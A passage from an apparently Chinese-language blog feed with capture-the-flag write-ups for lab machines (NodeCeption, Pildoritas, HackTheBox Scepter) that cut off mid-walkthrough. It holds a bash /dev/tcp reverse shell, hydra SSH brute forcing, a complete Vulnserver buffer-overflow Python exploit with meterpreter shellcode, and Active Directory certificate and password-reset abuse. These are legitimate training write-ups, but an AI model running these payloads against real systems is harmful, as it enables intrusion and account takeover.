SF:\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2025\x20Jul\x202025\x201
SF:2:12:38\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html
SF:\x20lang=\"en\">\n\t<head>\n\t\t<script\x20type=\"module\"\x20crossorig
SF:in\x20src=\"/assets/polyfills-B8p9DdqU\.js\"></script>\n\n\t\t<meta\x20
SF:charset=\"utf-8\"\x20/>\n\t\t<meta\x20http-equiv=\"X-UA-Compatible\"\x2
SF:0content=\"IE=edge\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\
SF:"width=device-width,initial-scale=1\.0\"\x20/>\n\t\t<link\x20rel=\"icon
```

### æšä¸¾æµ‹è¯•

`8765` `Apache`é»˜è®¤é¡µé¢

![image.png](/post-images/TheHackersLabsNodeCeption/image1.png)

`5678` `n8n`

![image.png](/post-images/TheHackersLabsNodeCeption/image2.png)

`n8n` å¯ä»¥åå¼¹ `shell`ï¼Œä½†æ˜¯è¦è¿›å…¥åå°ï¼Œå¹¶ä¸”éœ€è¦é‚®ç®±å’Œå¯†ç 

## å¯†ç çˆ†ç ´

æˆ‘ä¹ˆå¯»æ‰¾ä¸€ä¸‹å“ªé‡Œèƒ½æ‰¾åˆ°ä¿¡æ¯

`8765` æºç ä¸­å¾—åˆ°ä¿¡æ¯

![image.png](/post-images/TheHackersLabsNodeCeption/image3.png)

> usuario@maildelctf.com
å¸Œæœ›æ‚¨å·²æŒ‰ç…§è¯´æ˜æ›´æ”¹å¯†ç ã€‚
è¯·è®°ä½ï¼šå¯†ç è‡³å°‘ 8 ä¸ªå­—ç¬¦ï¼Œè‡³å°‘åŒ…å« 1 ä¸ªæ•°å­—å’Œ 1 ä¸ªå¤§å†™å­—æ¯ã€‚
> 

å¾—åˆ°ä¸€ä¸ªé‚®ç®±å’Œå¯†ç ç­–ç•¥

é€šè¿‡AI å†™å‡ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œç„¶ååŒ¹é… `rockyou` å‰ `5000` çš„å­—å…¸

```bash
âœ  NodeCeption head -n 5000 /usr/share/wordlists/rockyou.txt | grep -P '^(?=.*\d)(?=.*[A-Z]).{8,}$'                                                                          
Password1
PASSWORD1
```

ä½¿ç”¨ `usuario@maildelctf.com`:`Password1` å¯ä»¥ç™»å½•è¿›å»

![image.png](/post-images/TheHackersLabsNodeCeption/image4.png)

## n8n åå°åˆ©ç”¨

é€šè¿‡å·¥ä½œæµè¿è¡Œå‘½ä»¤

![image.png](/post-images/TheHackersLabsNodeCeption/image5.png)

æµ‹è¯•ä¸€ä¸‹

![image.png](/post-images/TheHackersLabsNodeCeption/image6.png)

æˆåŠŸè®¿é—®

![image.png](/post-images/TheHackersLabsNodeCeption/image7.png)

åå¼¹ `shell` ï¼Œè¿™é‡Œæ²¡æ³•ç”¨`nc` å¼¹

```bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.5/1234 0>&1'
```

![image.png](/post-images/TheHackersLabsNodeCeption/image8.png)

æ‹¿åˆ°ç«‹è¶³ç‚¹

```bash
âœ  NodeCeption nc -lvp 1234
listening on [any] 1234 ...
192.168.56.88: inverse host lookup failed: Unknown host
connect to [192.168.56.5] from (UNKNOWN) [192.168.56.88] 48536
bash: cannot set terminal process group (2231): Inappropriate ioctl for device
bash: no job control in this shell
thl@nodeception:~$ 
```

å½“å‰ç›®å½•ä¸­å¯ä»¥æ‹¿åˆ° `user.txt`

```bash
thl@nodeception:~$ cat user.txt 
THL_wxxxxxxxxxxxxxxxxxxx
```

## æƒé™æå‡

ä¸€çœ‹ç”¨æˆ·ç»„

```bash
thl@nodeception:~$ id
uid=1000(thl) gid=1000(thl) groups=1000(thl),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
```

å†çœ‹ `sudo` æƒé™

```bash
thl@nodeception:~$ sudo -l
Matching Defaults entries for thl on nodeception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User thl may run the following commands on nodeception:
    (ALL) NOPASSWD: /usr/bin/vi
    (ALL : ALL) ALL
```

ä½†æ˜¯æ‰§è¡Œæ—¶éœ€è¦æˆ‘ä»¬æä¾›å¯†ç 

å°è¯•`hydra`çˆ†ç ´

```bash
âœ  NodeCeption hydra -l thl -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.88 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-25 20:54:04
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://192.168.56.88:22/
[22][ssh] host: 192.168.56.88   login: thl   password: basketball
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-25 20:54:27
```

å¾—åˆ°å¯†ç  `basketball`

ç»“æŸ

```bash
thl@nodeception:~$ sudo cat /root/root.txt
[sudo] password for thl: 
THL_xxxxxxxxxxxxxxxxxxx
```

## æ€»ç»“

æ¢­å“ˆ]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>n8n</category>
            <category>hydra</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Pildoritas]]></title>
            <link>https://www.sunsetaction.top/2025/07/24/TheHackersLabsPildoritas</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/24/TheHackersLabsPildoritas</guid>
            <pubDate>Thu, 24 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Pildoritas https://labs.thehackerslabs.com/machine/67 Recon PortScan è¿™æ¬¡ä¸æ‰“ AD åŸŸ æšä¸¾æµ‹è¯• SMB åŒ¿åæšä¸¾ Vulnserver ä»nmap ä¸­çš„æ‰«æç»“æœèƒ½çŸ¥é“æ­å»ºç€ Vulnserver é¡¹ç›®é“¾æ¥ï¼šhttps://git...]]></description>
            <content:encoded><![CDATA[
# Pildoritas

> https://labs.thehackerslabs.com/machine/67
> 

![image.png](/post-images/TheHackersLabsPildoritas/image.png)

## Recon

### PortScan

```bash
âœ  Pildoritas nmap -sn 192.168.56.0/24               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:00 CST
Nmap scan report for 192.168.56.1
Host is up (0.00052s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00037s latency).
MAC Address: 08:00:27:31:BB:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.93
Host is up (0.00069s latency).
MAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 6.09 seconds
```

è¿™æ¬¡ä¸æ‰“ `AD` åŸŸ

```bash
âœ  Pildoritas nmap -sT -min-rate 10000 -p- 192.168.56.93    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:00 CST
Warning: 192.168.56.93 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.93
Host is up (0.00029s latency).
Not shown: 65267 closed tcp ports (conn-refused), 257 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9999/tcp  open  abyss
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
```

```bash
âœ  Pildoritas nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.93
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:11 CST                                                                                                                                 
Nmap scan report for 192.168.56.93                                                              
Host is up (0.00035s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 7.0
|_http-title: 404: archivo o directorio no encontrado.
|_http-server-header: Microsoft-IIS/7.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
9999/tcp open  vulnserver    Vulnserver
MAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
|_clock-skew: 6h59m57s
| smb2-time: 
|   date: 2025-07-24T21:12:18
|_  start_date: 2025-07-24T20:57:33
|_nbstat: NetBIOS name: WIN-LVJNVVHBWSR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms 192.168.56.93
```

### æšä¸¾æµ‹è¯•

`SMB` åŒ¿åæšä¸¾

```bash
âœ  Pildoritas smbclient -L 192.168.56.93 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILUR
```

## Vulnserver

ä»`nmap` ä¸­çš„æ‰«æç»“æœèƒ½çŸ¥é“æ­å»ºç€ `Vulnserver`

é¡¹ç›®é“¾æ¥ï¼šhttps://github.com/stephenbradshaw/vulnserver

```bash
âœ  Pildoritas nc 192.168.56.93 9999 
Welcome to Vulnerable Server! Enter HELP for help.
```

ç›´æ¥ä»ç½‘ä¸Šæ‰¾ `POC` ï¼šhttps://forum.butian.net/share/4013

å°†é‡Œé¢çš„`payload` æ¢æˆè‡ªå·±çš„å°±è¡Œ

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=1234 -f c -e x86/shikata\_ga\_nai -b "\\x00" -f python -v shellcode
```

```bash
#!/usr/bin/python

import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 9999
    size = 2006

    shellcode = b"\x90" * 20
    
    // æ›¿æ¢
    shellcode += b"\xd9\xc0\xd9\x74\x24\xf4\x58\x31\xc9\xbb\x6b"
    shellcode += b"\xc5\x71\xf0\xb1\x59\x31\x58\x19\x83\xe8\xfc"
    shellcode += b"\x03\x58\x15\x89\x30\x8d\x18\xc2\xbb\x6e\xd9"
    shellcode += b"\xbc\x32\x8b\xe8\xee\x21\xdf\x59\x3e\x21\x8d"
    shellcode += b"\x51\xb5\x67\x26\x5b\x36\x0c\x34\xb3\xc7\xa4"
    shellcode += b"\xf3\xe5\xe6\x0a\xaf\xd6\x69\xf7\xb2\x0a\x49"
    shellcode += b"\xc6\x7c\x5f\x88\x0f\xcb\x15\x65\xdd\x9b\x5e"
    shellcode += b"\x2b\xf2\xa8\x23\xf7\xf3\x7e\x28\x47\x8c\xfb"
    shellcode += b"\xef\x33\x20\x05\x20\x30\xf0\x1d\x4b\x1e\x21"
    shellcode += b"\x1f\x98\xce\xa4\xd6\x6a\xd2\x97\x17\xdb\xa1"
    shellcode += b"\xec\x6c\xdd\x63\x3d\xb3\x1f\x44\x33\x9f\xa1"
    shellcode += b"\x9d\x74\x3f\xd4\xd5\x86\xc2\xef\x2e\xf4\x18"
    shellcode += b"\x65\xb0\x5e\xea\xdd\x14\x5e\x3f\xbb\xdf\x6c"
    shellcode += b"\xf4\xcf\x87\x70\x0b\x03\xbc\x8d\x80\xa2\x12"
    shellcode += b"\x04\xd2\x80\xb6\x4c\x80\xa9\xef\x28\x67\xd5"
    shellcode += b"\xef\x95\xd8\x73\x64\x37\x0e\x03\x85\xc7\x2f"
    shellcode += b"\x59\x11\x0b\xe2\x62\xe1\x03\x75\x10\xd3\x8c"
    shellcode += b"\x2d\xbe\x5f\x44\xe8\x39\xd6\x42\x0b\x95\x50"
    shellcode += b"\x02\xf5\x16\xa0\x0a\x32\x42\xf0\x24\x93\xeb"
    shellcode += b"\x9b\xb4\x1c\x3e\x31\xbf\x8a\x01\x6d\x87\x4f"
    shellcode += b"\xea\x6f\xf8\x4b\x38\xe6\x1e\x03\xec\xa8\x8e"
    shellcode += b"\xe4\x5c\x08\x7f\x8d\xb6\x87\xa0\xad\xb8\x42"
    shellcode += b"\xc9\x44\x57\x3a\xa1\xf0\xce\x67\x39\x60\x0e"
    shellcode += b"\xb2\x47\xa2\x84\x36\xb7\x6d\x6d\x33\xab\x9a"
    shellcode += b"\x0a\xbb\x33\x5b\xbf\xbb\x59\x5f\x69\xec\xf5"
    shellcode += b"\x5d\x4c\xda\x59\x9d\xbb\x59\x9d\x61\x3a\x6b"
    shellcode += b"\xd5\x54\xa8\xd3\x81\x98\x3c\xd3\x51\xcf\x56"
    shellcode += b"\xd3\x39\xb7\x02\x80\x5c\xb8\x9e\xb5\xcc\x2d"
    shellcode += b"\x21\xef\xa1\xe6\x49\x0d\x9f\xc1\xd5\xee\xca"
    shellcode += b"\x51\x11\x10\x88\x7d\xba\x78\x72\x3e\x3a\x78"
    shellcode += b"\x18\xbe\x6a\x10\xd7\x91\x85\xd0\x18\x38\xce"
    shellcode += b"\x78\x92\xad\xbc\x19\xa3\xe7\x61\x87\xa4\x04"
    shellcode += b"\xba\x38\xde\x65\x3d\xb9\x1f\x6c\x5a\xba\x1f"
    shellcode += b"\x90\x5c\x87\xc9\xa9\x2a\xc6\xc9\x8d\x25\x7d"
    shellcode += b"\x6f\xa7\xaf\x7d\x23\xb7\xe5"

    inputBuffer = b"TRUN ." + b"\x41" * size + b"\xaf\x11\x50\x62" + shellcode

    buf = inputBuffer

    print("Sending evil buffer...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")
```

è¿è¡ŒåæˆåŠŸæ‹¿åˆ° `Shell`

![image.png](/post-images/TheHackersLabsPildoritas/image1.png)

ç›´æ¥å°±æ˜¯`SYSTEM` æƒé™

```bash
meterpreter > ls
Listing: C:\Users\Administrador\Desktop
=======================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  282    fil   2024-07-22 00:38:48 +0800  desktop.ini
100666/rw-rw-rw-  1646   fil   2024-07-22 01:00:39 +0800  essfunc.c
100666/rw-rw-rw-  16601  fil   2024-07-22 01:00:11 +0800  essfunc.dll
100666/rw-rw-rw-  36     fil   2024-07-22 01:46:33 +0800  root.txt
100666/rw-rw-rw-  9033   fil   2024-07-22 01:00:31 +0800  vulnserver.c
100777/rwxrwxrwx  29624  fil   2024-07-22 00:59:45 +0800  vulnserver.exe

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > cat root.txt
be3751d9c6dxxxxxxxxxxxxxxxxxxxxxxx  -

meterpreter > cat user.txt
3163xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  -
```

## æ€»ç»“

ä¸æ¸…æ¥šæ˜¯å¦æ˜¯è®©ç›´æ¥æ¢­å“ˆ

è¿˜æ˜¯æœ‰é¢„æœŸåšæ³•

æ„Ÿè§‰æ€ªæ€ªçš„]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Vulnserver</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Scepter]]></title>
            <link>https://www.sunsetaction.top/2025/07/24/HackTheBoxMachine - Scepter</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/24/HackTheBoxMachine - Scepter</guid>
            <pubDate>Sat, 26 Apr 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Scepterl https://app.hackthebox.com/machines/Scepter | Hard PSï¼šä¸€ç›´ä»¥ä¸º Season è¿‡äº†ä¹‹åå°±ä¸èƒ½ç™½å«–é¶æœºäº†â€¦å¯¼è‡´é”™è¿‡äº†ä¸¤å‘¨çš„é¶æœºâ€¦å‘œå‘œå‘œ å‰æœŸè¸©ç‚¹ Windows é¶æœºçš„ç«¯å£ï¼Œä½†ä¸ä¸€å®šæ˜¯åŸŸæ§ä¸»æœºï¼ˆPS:åé¢æ‰çŸ¥é“æˆ‘æ‰«...]]></description>
            <content:encoded><![CDATA[# Machine - Scepterl

> https://app.hackthebox.com/machines/Scepter | `Hard`
> 

PSï¼šä¸€ç›´ä»¥ä¸º Season è¿‡äº†ä¹‹åå°±ä¸èƒ½ç™½å«–é¶æœºäº†â€¦å¯¼è‡´é”™è¿‡äº†ä¸¤å‘¨çš„é¶æœºâ€¦å‘œå‘œå‘œ

## å‰æœŸè¸©ç‚¹

```bash
âœ  Scepter nmap -sT -min-rate 10000 -p- 10.10.11.65        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-24 10:18 EDT
Nmap scan report for 10.10.11.65
Host is up (0.30s latency).
Not shown: 65306 filtered tcp ports (no-response), 224 closed tcp ports (conn-refused)
PORT    STATE SERVICE
53/tcp  open  domain
111/tcp open  rpcbind
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 66.89 seconds
```

`Windows` é¶æœºçš„ç«¯å£ï¼Œä½†ä¸ä¸€å®šæ˜¯åŸŸæ§ä¸»æœºï¼ˆPS:åé¢æ‰çŸ¥é“æˆ‘æ‰«æå‡ºæ¥çš„ç«¯å£shaoï¼‰

```bash
âœ  Scepter nmap -sT -A -T4 -O -p 53,111,135,139,445 10.10.11.65
Nmap scan report for 10.10.11.65
Host is up (0.40s latency).

PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
111/tcp open  rpcbind?
| rpcinfo:
|   program version    port/proto  service
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  4           2049/tcp   nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Micro
soft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 143
93 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-04-24T22:05:35
|_  start_date: N/A
|_clock-skew: 7h40m16s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   464.44 ms 10.10.16.1
2   291.53 ms 10.10.11.65

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 251.59 seconds
```

## NFS

```bash
rpcdump.py scepter.htb -target-ip 10.10.11.65
```

å¾ˆå¤šçš„ä¿¡æ¯ï¼Œå°è¯•ä»é‡Œé¢è·å–æœ‰ç”¨çš„ä¿¡æ¯ï¼Œç»“æœä¿å­˜åœ¨ `rpcdump_resule.txt`

ä¸»æœºä¸º `DC01.scepter.htb` ï¼Œé‚£å°±èƒ½ç¡®å®šæ˜¯åŸŸæ§äº†

NMAP ä¸­æ‰«æå‡ºäº†é¶æœºå¼€å¯äº† NFSï¼Œå°è¯•ä¸€ä¸‹åŒ¿åè®¿é—®ã€‚

```bash
âœ  Scepter showmount -e 10.10.11.65
Export list for 10.10.11.65:
/helpdesk (everyone)

âœ  Scepter mkdir nfs
âœ  Scepter sudo mount -t nfs 10.10.11.65:/helpdesk /root/Desktop/test/Scepter/nfs

âœ  Scepter cd nfs   
âœ  nfs ls
baker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx
```

## To D.baker

ä½¿ç”¨ openssl æŸ¥çœ‹ `baker.crt` çš„å†…å®¹

```bash
âœ  nfs_backup openssl x509 -in baker.crt -text -noout
Certificate:                                                                                                                                                                                                    
    Data:                                 
        Version: 3 (0x2)                                                                                                                                                                                        
        Serial Number:            
            62:00:00:00:32:e1:a5:c3:91:51:31:09:7b:00:00:00:00:00:32
        Signature Algorithm: sha256WithRSAEncryption 
        Issuer: DC=htb, DC=scepter, CN=scepter-DC01-CA
        Validity                       
            Not Before: Nov  2 01:13:46 2024 GMT                                                        
            Not After : Nov  2 01:13:46 2025 GMT
        Subject: DC=htb, DC=scepter, CN=Users, CN=d.baker, emailAddress=d.baker@scepter.htb
        Subject Public Key Info:         
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)                                         
```

å°è¯•ç”Ÿæˆ `pfx` æ–‡ä»¶ï¼Œç”¨äºè®¤è¯çš„å¯†ç æ˜¯ `newpassword` ï¼ˆæš‚æ—¶ä¸çŸ¥é“å¦‚ä½•è·å¾—ï¼Œå¼±å¯†ç ï¼Ÿï¼‰ï¼Œæ–°è®¾ç½®å¯†ç ä¸ºç©ºå¯†ç 

```bash
âœ  nfs_backup openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt
Enter pass phrase for baker.key:
Enter Export Password:
Verifying - Enter Export Password:
```

é€šè¿‡ `certipy-ad` æå–ç”¨æˆ· hash

```bash
âœ  Scepter sudo ntpdate 10.10.11.65 | certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username d.baker
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: d.baker@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```

```bash
aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```

æ£€æŸ¥å¯†ç æœ‰æ•ˆæ€§

```bash
âœ  Scepter nxc smb 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.65     445    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce 
```

```bash
âœ  Scepter nxc ldap 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.65     389    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce 
```

```bash
âœ  Scepter bloodhound-python -u 'd.baker' -d 'scepter.htb' -ns 10.10.11.65 --zip -c All -dc 'DC01.scepter.htb' --hashes 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce'   
INFO: Found AD domain: scepter.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: DC01.scepter.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.scepter.htb
INFO: Found 11 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.scepter.htb
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 00M 27S
INFO: Compressing output into 20250425062047_bloodhound.zip
```

## To A.carter

### æƒé™æ»¥ç”¨

BloodHoundåˆ†æï¼Œ`d.baker` å±äº `STAFF ACCESS CERTICICATE` çš„

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image.png)

å› ä¸ºè¿™ä¸ªå…³ç³»ï¼Œ`d.baker` å¯ä»¥ä¿®æ”¹ `a.carter` çš„å¯†ç 

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image1.png)

ä¿®æ”¹å¯†ç  `123456`

```bash
âœ  nfs_backup changepasswd.py 'scepter.htb/a.carter@10.10.11.65' -newpass 123456 -altuser 'd.baker' -althash 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce' -reset
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of scepter.htb\a.carter as scepter.htb\d.baker
[*] Connecting to DCE/RPC as scepter.htb\d.baker
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

æ£€éªŒæ˜¯å¦ä¿®æ”¹æˆåŠŸ

```bash
âœ  nfs_backup nxc smb 10.10.11.65 -u a.carter -p 123456       
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.65     445    DC01             [+] scepter.htb\a.carter:123456 
```

## To H.brown

é€šè¿‡ BloodHound æŸ¥çœ‹ä¸€ä¸‹ a.carter çš„æƒé™ã€‚å¯¹ `STAFF ACCESS CERTIFICATE` æœ‰ GenericAll æƒé™

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image2.png)

èµ‹äºˆ a.carter å¯¹`STAFF ACCESS CERTIFICATE`  `Fullcontrol` æƒé™

```bash
âœ  nfs_backup dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'a.carter' -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'scepter.htb'/'a.carter':'123456'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250425-071815.bak
[*] DACL modified successfully!
```

```bash
âœ  Scepter bloodhound-python -u 'a.carter' -p '123456' -d 'scepter.htb' -ns 10.10.11.65 --zip -c All -dc 'DC01.scepter.htb' 
INFO: Found AD domain: scepter.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: DC01.scepter.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.scepter.htb
INFO: Found 11 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.scepter.htb
INFO: Done in 00M 31S
INFO: Compressing output into 20250425071924_bloodhound.zip
```

ç²—ç•¥ä¸€çœ‹æ²¡æ‰¾åˆ°é“¾å­ï¼Œå…ˆæ‰¾æ‰¾ä¸‹ä¸€ä¸ªç›®æ ‡è´¦æˆ·ï¼ŒæŸ¥çœ‹äº†ç”¨æˆ·åå‘ç° `h.brown` æ˜¯è¿œç¨‹ç®¡ç†ç»„æˆå‘˜ï¼Œæš‚ä¸”å°†å…¶ä½œä¸ºç›®æ ‡ç”¨æˆ·ã€‚

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image3.png)

### ESC9

ä¸€å¼€å§‹ç»™æˆ‘ä»¬æä¾›çš„å°±æ˜¯è¯ä¹¦æ¥è·å¾—ç”¨æˆ·ï¼Œæ‰€ä»¥çŸ¥è¯†ç‚¹å¯èƒ½åœ¨ AD CS

ä½¿ç”¨ certipy æ”¶é›†æ•°æ®

```bash
âœ  Scepter certipy-ad find -u a.carter@scepter.htb -p 123456 -dc-ip 10.10.11.65 -bloodhound                                                                                     
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'scepter-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'scepter-DC01-CA' via RRP
[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via RRP: The NETBIOS connection with the remote host timed out.
[!] Failed to get CA configuration for 'scepter-DC01-CA'
